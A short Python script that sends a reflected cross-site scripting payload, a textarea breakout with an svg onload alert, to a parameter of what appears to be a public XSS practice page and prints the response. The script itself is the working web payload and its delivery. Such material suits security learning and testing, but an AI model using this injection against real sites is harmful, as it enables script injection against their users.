#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

payload = '</textarea><svg/onload=alert(1)>'

params = {'p10': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
